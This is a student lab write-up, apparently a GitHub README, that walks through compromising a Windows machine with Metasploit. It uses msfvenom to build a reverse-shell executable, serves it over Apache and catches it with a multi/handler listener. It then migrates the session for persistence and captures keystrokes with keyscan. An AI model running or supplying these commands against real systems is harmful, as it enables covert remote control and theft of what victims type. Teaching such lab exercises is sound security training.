# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig 322251922-6e11e35c-4c2c-4b7f-b903-58b1582a464b
![326166201-64512098-0d84-4645-9059-68ed6b6b5adc](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/131433133/393ed3d5-efb8-44ef-8082-3c7d6a12c3b4)
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe 
![326166233-3bde8b72-fa12-42de-acd2-5ece3ce69ac6](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/131433133/e27602cf-4e02-4604-a34a-98d73a124625)
copy the fun.exe into the apache /var/www/html folder 
![326166259-4e5d8477-9f77-49ef-9deb-5dc660daafd1](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/131433133/05c72a7b-a426-4e30-ab2a-5ca4d3a03661)
Start apache server sudo systemctl apache2 start
![326166277-48fa7c6c-eef6-4979-b607-4e1404e804b1](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/131433133/8ccd41c0-096c-44df-b2ea-5f9923139797)
Check the status of apache2
![326166296-0fdb2841-36e8-47af-b0b7-385bc1f4e828](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/131433133/e9012cb0-e60d-4b46-83a2-89f5273dd91c)
Invoke msfconsole: Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
![326166316-27254eeb-6e3e-4ca0-938f-fa39732b8b8a]
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads. (https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/131433133/6a71f1a6-830e-4160-8355-3cb87ec0e619)
![326166328-526ad741-5b14-4834-ad3a-e6da1c055443](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/131433133/0c1e87cf-0d93-4b73-b854-073f176360f0)
Bypass any warning boxes, double-click the file, and allow it to run. On kali give the command exploit
![326166338-6bf1ff2b-9c4d-4182-83a8-08084c38ecb6](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/131433133/e3cbc0ef-2ff1-42c9-8652-be2561ae0d1b)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156 The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![326166376-7384bedc-8b4f-466d-b23b-62d731f12222](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/131433133/907beef6-2d4c-4006-8283-c3732350f62e)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name
![326166382-2c5bae06-069c-4f6d-b2ae-517962997c9d](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/131433133/f9024554-a29a-4ab1-bdee-f0d3500b9767)
keyscan_dump Shows the keystrokes captured so far
![326166391-be9cd713-7ed5-40d9-aa86-05697e778414](https://github.com/gowriganeshns/Compromising-windows-using-Metasploit/assets/131433133/9b8e4748-0513-4b04-80c2-33764da9e208)
## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
